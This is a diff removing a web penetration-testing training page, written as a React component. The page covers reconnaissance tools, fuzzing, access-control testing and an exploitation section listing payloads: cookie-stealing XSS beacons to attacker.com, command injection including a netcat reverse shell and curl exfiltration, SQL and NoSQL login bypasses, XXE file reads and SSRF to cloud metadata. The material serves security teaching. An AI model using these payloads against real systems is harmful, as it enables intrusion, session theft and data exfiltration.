-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Subdomain Enumeration Mastery</h3>
-      
-      <Tabs defaultValue="active" className="w-full">
-        <TabsList className="grid w-full grid-cols-3">
-          <TabsTrigger value="active">Active Enumeration</TabsTrigger>
-          <TabsTrigger value="passive">Passive Enumeration</TabsTrigger>
-          <TabsTrigger value="dns">DNS Techniques</TabsTrigger>
-        </TabsList>
-
-        <TabsContent value="active" className="space-y-4">
-          <div className="grid md:grid-cols-2 gap-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Active Tools</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">amass enum -active -d example.com</code>
-                <code className="block text-sm">subfinder -d example.com -all</code>
-                <code className="block text-sm">assetfinder --subs-only example.com</code>
-                <code className="block text-sm">sublist3r -d example.com -e google,bing,yahoo</code>
-              </div>
-            </div>
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">DNS Brute Forcing</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">fierce --domain example.com</code>
-                <code className="block text-sm">dnsrecon -d example.com -t brt</code>
-                <code className="block text-sm">subbrute example.com</code>
-                <code className="block text-sm">gobuster dns -d example.com -w wordlist.txt</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="passive" className="space-y-4">
-          <div className="grid md:grid-cols-2 gap-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Certificate Transparency</h4>
-              <div className="space-y-2">
-                <Badge variant="outline">crt.sh</Badge>
-                <Badge variant="outline">censys.io</Badge>
-                <Badge variant="outline">Facebook CT API</Badge>
-                <Badge variant="outline">Google CT Logs</Badge>
-              </div>
-            </div>
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Search Engine Discovery</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">site:*.example.com</code>
-                <code className="block text-sm">site:example.com subdomains</code>
-                <code className="block text-sm">inurl:example.com</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="dns" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">Advanced DNS Techniques</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>Zone Transfer Attempts:</strong>
-                <code className="block mt-1 text-sm">dig @ns1.example.com example.com AXFR</code>
-              </div>
-              <div>
-                <strong>DNS Cache Snooping:</strong>
-                <code className="block mt-1 text-sm">dig @8.8.8.8 target.example.com +norecurse</code>
-              </div>
-              <div>
-                <strong>Wildcard Detection:</strong>
-                <code className="block mt-1 text-sm">dig randomstring123.example.com</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-      </Tabs>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Technology Stack Fingerprinting</h3>
-      
-      <div className="grid md:grid-cols-3 gap-4">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Web Technology Detection</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2">
-              <Badge variant="outline">Wappalyzer</Badge>
-              <Badge variant="outline">BuiltWith</Badge>
-              <Badge variant="outline">WhatWeb</Badge>
-              <Badge variant="outline">Netcraft</Badge>
-              <Badge variant="outline">BlindElephant</Badge>
-              <Badge variant="outline">Retire.js</Badge>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">HTTP Header Analysis</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-1 text-sm">
-              <div>• Server signatures</div>
-              <div>• Custom headers</div>
-              <div>• Security headers</div>
-              <div>• Cookie analysis</div>
-              <div>• Response timing</div>
-              <div>• Error fingerprinting</div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">JavaScript Framework Detection</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2">
-              <Badge variant="secondary">React</Badge>
-              <Badge variant="secondary">Vue.js</Badge>
-              <Badge variant="secondary">Angular</Badge>
-              <Badge variant="secondary">jQuery</Badge>
-              <Badge variant="secondary">Bootstrap</Badge>
-              <Badge variant="secondary">D3.js</Badge>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-  </div>
-);
-
-// Vulnerability Assessment Content Component
-const VulnerabilityAssessmentContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Bug className="h-5 w-5" />
-        Automated Scanning Tools Mastery
-      </h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Burp Suite Professional</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Advanced Configuration</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Scope management and exclusions</div>
-                  <div>• Custom insertion points</div>
-                  <div>• Session handling rules</div>
-                  <div>• Match and replace rules</div>
-                  <div>• Upstream proxy configuration</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Professional Features</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Burp Collaborator</div>
-                  <div>• Intruder attack types</div>
-                  <div>• Scanner customization</div>
-                  <div>• Extension development</div>
-                  <div>• CI/CD integration</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">OWASP ZAP Advanced Usage</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Automation Features</h4>
-                <div className="text-sm space-y-1">
-                  <div>• REST API integration</div>
-                  <div>• Docker containerization</div>
-                  <div>• CI/CD pipeline integration</div>
-                  <div>• Custom script development</div>
-                  <div>• Headless scanning</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Advanced Scanning</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Ajax spider configuration</div>
-                  <div>• Authentication handling</div>
-                  <div>• Context-based scanning</div>
-                  <div>• Custom payloads</div>
-                  <div>• Fuzzer integration</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Advanced Fuzzing Techniques</h3>
-      
-      <Tabs defaultValue="parameter" className="w-full">
-        <TabsList className="grid w-full grid-cols-4">
-          <TabsTrigger value="parameter">Parameter Fuzzing</TabsTrigger>
-          <TabsTrigger value="directory">Directory Fuzzing</TabsTrigger>
-          <TabsTrigger value="api">API Fuzzing</TabsTrigger>
-          <TabsTrigger value="custom">Custom Fuzzing</TabsTrigger>
-        </TabsList>
-
-        <TabsContent value="parameter" className="space-y-4">
-          <div className="grid md:grid-cols-2 gap-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Parameter Discovery Tools</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">ffuf -w wordlist.txt -u http://example.com/FUZZ</code>
-                <code className="block text-sm">wfuzz -w wordlist.txt http://example.com/?FUZZ=test</code>
-                <code className="block text-sm">arjun -u http://example.com/</code>
-                <code className="block text-sm">paramspider -d example.com</code>
-              </div>
-            </div>
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Advanced Techniques</h4>
-              <div className="space-y-1 text-sm">
-                <div>• HTTP Parameter Pollution</div>
-                <div>• Hidden parameter discovery</div>
-                <div>• Method override testing</div>
-                <div>• Content-Type manipulation</div>
-                <div>• Encoding bypass techniques</div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="directory" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">Directory Discovery Tools</h4>
-            <div className="grid md:grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <code className="block text-sm">gobuster dir -u http://example.com -w wordlist.txt</code>
-                <code className="block text-sm">feroxbuster -u http://example.com -w wordlist.txt</code>
-                <code className="block text-sm">dirsearch -u http://example.com</code>
-                <code className="block text-sm">dirb http://example.com wordlist.txt</code>
-              </div>
-              <div className="space-y-1 text-sm">
-                <div><strong>Advanced Options:</strong></div>
-                <div>• Recursive scanning</div>
-                <div>• Extension brute-forcing</div>
-                <div>• Status code filtering</div>
-                <div>• Response size analysis</div>
-                <div>• Custom headers</div>
-                <div>• Rate limiting</div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="api" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">API Endpoint Discovery</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>REST API Fuzzing:</strong>
-                <code className="block mt-1 text-sm">ffuf -w api-wordlist.txt -u http://api.example.com/v1/FUZZ</code>
-              </div>
-              <div>
-                <strong>GraphQL Endpoint Discovery:</strong>
-                <code className="block mt-1 text-sm">ffuf -w graphql-paths.txt -u http://example.com/FUZZ</code>
-              </div>
-              <div>
-                <strong>API Version Enumeration:</strong>
-                <code className="block mt-1 text-sm">ffuf -w versions.txt -u http://api.example.com/FUZZ/users</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="custom" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">Custom Payload Generation</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>Wordlist Creation:</strong>
-                <code className="block mt-1 text-sm">cewl http://example.com -w custom-wordlist.txt</code>
-              </div>
-              <div>
-                <strong>Pattern-based Generation:</strong>
-                <code className="block mt-1 text-sm">crunch 8 8 -t @@@@%%%% -o passwords.txt</code>
-              </div>
-              <div>
-                <strong>Context-aware Fuzzing:</strong>
-                <div className="text-sm mt-1">• Technology-specific payloads</div>
-                <div className="text-sm">• Business logic patterns</div>
-                <div className="text-sm">• Custom mutation algorithms</div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-      </Tabs>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Commercial vs Open Source Tools</h3>
-      
-      <div className="grid md:grid-cols-3 gap-4">
-        <Card className="border-green-500/30">
-          <CardHeader>
-            <CardTitle className="text-lg text-green-400">Enterprise Tools</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div>
-                <Badge variant="outline" className="mb-2">Acunetix ($4,500+/year)</Badge>
-                <div className="text-sm">High accuracy, modern web app support</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">Nessus Pro ($3,990/year)</Badge>
-                <div className="text-sm">Comprehensive vulnerability database</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">Qualys VMDR ($2,995+/year)</Badge>
-                <div className="text-sm">Cloud-based, scalable scanning</div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-blue-500/30">
-          <CardHeader>
-            <CardTitle className="text-lg text-blue-400">Professional Tools</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div>
-                <Badge variant="outline" className="mb-2">Burp Suite Pro ($399/year)</Badge>
-                <div className="text-sm">Manual testing integration</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">InsightAppSec ($12,000+/year)</Badge>
-                <div className="text-sm">DevSecOps integration</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">Invicti ($3,600+/year)</Badge>
-                <div className="text-sm">Automated verification</div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-orange-500/30">
-          <CardHeader>
-            <CardTitle className="text-lg text-orange-400">Open Source Tools</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div>
-                <Badge variant="outline" className="mb-2">OWASP ZAP (Free)</Badge>
-                <div className="text-sm">Comprehensive, community-driven</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">Nuclei (Free)</Badge>
-                <div className="text-sm">YAML-based scanner</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">Nikto (Free)</Badge>
-                <div className="text-sm">Web server scanner</div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-  </div>
-);
-
-// Manual Testing Content Component
-const ManualTestingContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Target className="h-5 w-5" />
-        Session Management Testing
-      </h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Session Token Analysis</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Randomness Testing</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Entropy analysis</div>
-                  <div>• Pattern detection</div>
-                  <div>• Predictability assessment</div>
-                  <div>• Statistical analysis</div>
-                  <div>• Sequence correlation</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Token Scope Validation</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Domain restrictions</div>
-                  <div>• Path limitations</div>
-                  <div>• Secure transmission</div>
-                  <div>• HttpOnly flag testing</div>
-                  <div>• SameSite attribute</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Authentication Bypass Techniques</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">SQL Injection in Login</h4>
-                <code className="text-sm block">admin' --</code>
-                <code className="text-sm block">admin' OR '1'='1' --</code>
-                <code className="text-sm block">' UNION SELECT 1,1,1 --</code>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">NoSQL Injection</h4>
-                <code className="text-sm block">{"username":{"$ne":null}}</code>
-                <code className="text-sm block">{"username":{"$regex":".*"}}</code>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Parameter Pollution</h4>
-                <code className="text-sm block">user=admin&user=guest</code>
-                <code className="text-sm block">role=user&role=admin</code>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Authorization Testing Framework</h3>
-      
-      <Tabs defaultValue="vertical" className="w-full">
-        <TabsList className="grid w-full grid-cols-4">
-          <TabsTrigger value="vertical">Vertical Escalation</TabsTrigger>
-          <TabsTrigger value="horizontal">Horizontal Escalation</TabsTrigger>
-          <TabsTrigger value="idor">IDOR Testing</TabsTrigger>
-          <TabsTrigger value="function">Function-Level</TabsTrigger>
-        </TabsList>
-
-        <TabsContent value="vertical" className="space-y-4">
-          <div className="grid md:grid-cols-2 gap-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">User to Admin Escalation</h4>
-              <div className="space-y-2 text-sm">
-                <div>• Role parameter manipulation</div>
-                <div>• Hidden admin functions discovery</div>
-                <div>• Administrative endpoint access</div>
-                <div>• Privilege inheritance testing</div>
-                <div>• Multi-step escalation chains</div>
-              </div>
-            </div>
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Testing Methodology</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">POST /admin/users HTTP/1.1</code>
-                <code className="block text-sm">Cookie: role=user; sessionid=xyz</code>
-                <code className="block text-sm">Content-Type: application/json</code>
-                <code className="block text-sm">{"action":"delete","userId":"123"}</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="horizontal" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">Cross-User Access Testing</h4>
-            <div className="grid md:grid-cols-2 gap-4">
-              <div>
-                <strong>User A Session:</strong>
-                <code className="block mt-1 text-sm">GET /api/profile/123</code>
-                <code className="block text-sm">Cookie: sessionid=userA_session</code>
-              </div>
-              <div>
-                <strong>Access User B Data:</strong>
-                <code className="block mt-1 text-sm">GET /api/profile/124</code>
-                <code className="block text-sm">Cookie: sessionid=userA_session</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="idor" className="space-y-4">
-          <div className="space-y-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">IDOR Testing Techniques</h4>
-              <div className="grid md:grid-cols-2 gap-4">
-                <div>
-                  <strong>Numeric IDs:</strong>
-                  <div className="text-sm mt-1 space-y-1">
-                    <code className="block">/user/profile?id=123</code>
-                    <code className="block">/user/profile?id=124</code>
-                    <code className="block">/user/profile?id=125</code>
-                  </div>
-                </div>
-                <div>
-                  <strong>GUID Enumeration:</strong>
-                  <div className="text-sm mt-1 space-y-1">
-                    <code className="block">/doc/550e8400-e29b-41d4-a716</code>
-                    <code className="block">/doc/6ba7b810-9dad-11d1-80b4</code>
-                  </div>
-                </div>
-              </div>
-            </div>
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Advanced IDOR Scenarios</h4>
-              <div className="space-y-2 text-sm">
-                <div>• Base64 encoded references</div>
-                <div>• Hash-based object references</div>
-                <div>• Multi-step IDOR chains</div>
-                <div>• File path manipulation</div>
-                <div>• Database record enumeration</div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="function" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">Function-Level Access Control</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>Administrative Functions:</strong>
-                <code className="block mt-1 text-sm">POST /admin/createUser</code>
-                <code className="block text-sm">POST /admin/deleteUser</code>
-                <code className="block text-sm">GET /admin/systemLogs</code>
-              </div>
-              <div>
-                <strong>Hidden Endpoints:</strong>
-                <code className="block mt-1 text-sm">GET /api/internal/debug</code>
-                <code className="block text-sm">POST /api/maintenance/reset</code>
-                <code className="block text-sm">GET /dev/phpinfo</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-      </Tabs>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Business Logic Testing</h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Workflow Manipulation</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Step Skipping</h4>
-                <div className="text-sm">
-                  Bypass multi-step processes by directly accessing final steps
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Process Reversal</h4>
-                <div className="text-sm">
-                  Navigate backwards in workflows to corrupt state
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Race Conditions</h4>
-                <div className="text-sm">
-                  Concurrent execution of business processes
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">E-commerce Testing</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Price Manipulation</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Negative quantity values</div>
-                  <div>• Currency conversion abuse</div>
-                  <div>• Discount stacking</div>
-                  <div>• Tax calculation bypass</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Inventory Bypass</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Stock level manipulation</div>
-                  <div>• Reservation system abuse</div>
-                  <div>• Concurrent purchase attempts</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-  </div>
-);
-
-// Exploitation Content Component
-const ExploitationContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Zap className="h-5 w-5" />
-        Advanced Payload Crafting
-      </h3>
-      
-      <Tabs defaultValue="xss" className="w-full">
-        <TabsList className="grid w-full grid-cols-5">
-          <TabsTrigger value="xss">XSS Payloads</TabsTrigger>
-          <TabsTrigger value="sql">SQL Injection</TabsTrigger>
-          <TabsTrigger value="cmd">Command Injection</TabsTrigger>
-          <TabsTrigger value="xxe">XXE Exploitation</TabsTrigger>
-          <TabsTrigger value="ssrf">SSRF Attacks</TabsTrigger>
-        </TabsList>
-
-        <TabsContent value="xss" className="space-y-4">
-          <div className="space-y-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Basic XSS Payloads</h4>
-              <div className="space-y-2">
-                <code className="block text-sm break-all">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
-                <code className="block text-sm break-all">&lt;img src=x onerror=alert('XSS')&gt;</code>
-                <code className="block text-sm break-all">&lt;svg onload=alert('XSS')&gt;</code>
-                <code className="block text-sm break-all">&lt;body onload=alert('XSS')&gt;</code>
-              </div>
-            </div>
-            
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Filter Bypass Techniques</h4>
-              <div className="space-y-2">
-                <code className="block text-sm break-all">&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</code>
-                <code className="block text-sm break-all">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code>
-                <code className="block text-sm break-all">&lt;script&gt;alert(/XSS/.source)&lt;/script&gt;</code>
-                <code className="block text-sm break-all">&lt;script&gt;alert`XSS`&lt;/script&gt;</code>
-              </div>
-            </div>
-
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Advanced XSS Techniques</h4>
-              <div className="space-y-2">
-                <code className="block text-sm break-all">&lt;script&gt;fetch('/api/sensitive').then(r=&gt;r.text()).then(d=&gt;location='//attacker.com/?'+d)&lt;/script&gt;</code>
-                <code className="block text-sm break-all">&lt;script&gt;new Image().src='//attacker.com/?cookie='+document.cookie&lt;/script&gt;</code>
-                <code className="block text-sm break-all">&lt;script&gt;navigator.sendBeacon('//attacker.com', new FormData(document.forms[0]))&lt;/script&gt;</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="sql" className="space-y-4">
-          <div className="space-y-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Union-based Injection</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">' UNION SELECT 1,2,3,4,5--</code>
-                <code className="block text-sm">' UNION ALL SELECT NULL,NULL,NULL--</code>
-                <code className="block text-sm">' UNION SELECT @@version,NULL,NULL--</code>
-                <code className="block text-sm">' UNION SELECT user(),database(),version()--</code>
-              </div>
-            </div>
-            
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Boolean-based Blind Injection</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">' AND 1=1--</code>
-                <code className="block text-sm">' AND LENGTH(database()) &gt; 5--</code>
-                <code className="block text-sm">' AND SUBSTR(database(),1,1)='a'--</code>
-                <code className="block text-sm">' AND ASCII(SUBSTR(database(),1,1)) &gt; 97--</code>
-              </div>
-            </div>
-
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Time-based Blind Injection</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">'; WAITFOR DELAY '00:00:05'--</code>
-                <code className="block text-sm">' AND SLEEP(5)--</code>
-                <code className="block text-sm">'; SELECT pg_sleep(5)--</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="cmd" className="space-y-4">
-          <div className="space-y-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Basic Command Injection</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">; ls -la</code>
-                <code className="block text-sm">| whoami</code>
-                <code className="block text-sm">&& cat /etc/passwd</code>
-                <code className="block text-sm">|| uname -a</code>
-              </div>
-            </div>
-            
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Advanced Bypass Techniques</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">; w'h'o'a'm'i</code>
-                <code className="block text-sm">; who$IFS$()ami</code>
-                <code className="block text-sm">; echo "d2hvYW1p" | base64 -d | sh</code>
-                <code className="block text-sm">; printf "\x77\x68\x6f\x61\x6d\x69" | sh</code>
-              </div>
-            </div>
-
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Blind Command Injection</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">; sleep 5</code>
-                <code className="block text-sm">; curl http://attacker.com/$(whoami)</code>
-                <code className="block text-sm">; nslookup $(whoami).attacker.com</code>
-                <code className="block text-sm">; nc attacker.com 4444 -e /bin/sh</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="xxe" className="space-y-4">
-          <div className="space-y-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Basic XXE</h4>
-              <div className="space-y-2">
-                <code className="block text-sm break-all">
-                  &lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>
-                  &lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;<br/>
-                  &lt;root&gt;&xxe;&lt;/root&gt;
-                </code>
-              </div>
-            </div>
-            
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Blind XXE with External DTD</h4>
-              <div className="space-y-2">
-                <code className="block text-sm break-all">
-                  &lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>
-                  &lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt;%remote;%intern;%trick;]&gt;<br/>
-                  &lt;root&gt;&lt;/root&gt;
-                </code>
-              </div>
-            </div>
-
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">SSRF via XXE</h4>
-              <div className="space-y-2">
-                <code className="block text-sm break-all">
-                  &lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>
-                  &lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;]&gt;<br/>
-                  &lt;root&gt;&xxe;&lt;/root&gt;
-                </code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="ssrf" className="space-y-4">
-          <div className="space-y-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Cloud Metadata Access</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">http://169.254.169.254/latest/meta-data/</code>
-                <code className="block text-sm">http://metadata.google.internal/computeMetadata/v1/</code>
-                <code className="block text-sm">http://169.254.169.254/metadata/instance?api-version=2017-08-01</code>
-              </div>
-            </div>
-            
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Protocol Smuggling</h4>
-              <div className="space-y-2">
-                <code className="block text-sm break-all">gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com</code>
-                <code className="block text-sm">dict://127.0.0.1:11211/stats</code>
-                <code className="block text-sm">ldap://127.0.0.1:389/</code>
-              </div>
-            </div>
-
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Bypass Techniques</h4>
-              <div className="space-y-2">
-                <code className="block text-sm">http://127.0.0.1.xip.io/</code>
-                <code className="block text-sm">http://0x7F000001/ (hex)</code>
-                <code className="block text-sm">http://2130706433/ (decimal)</code>
-                <code className="block text-sm">http://[::1]/</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-      </Tabs>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Chaining Vulnerabilities</h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Multi-Step Attack Chains</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">CSRF + Stored XSS</h4>
-                <div className="text-sm">Cross-site request to inject persistent payload</div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">IDOR + Privilege Escalation</h4>
-                <div className="text-sm">Access control bypass to admin functions</div>
-              </div>
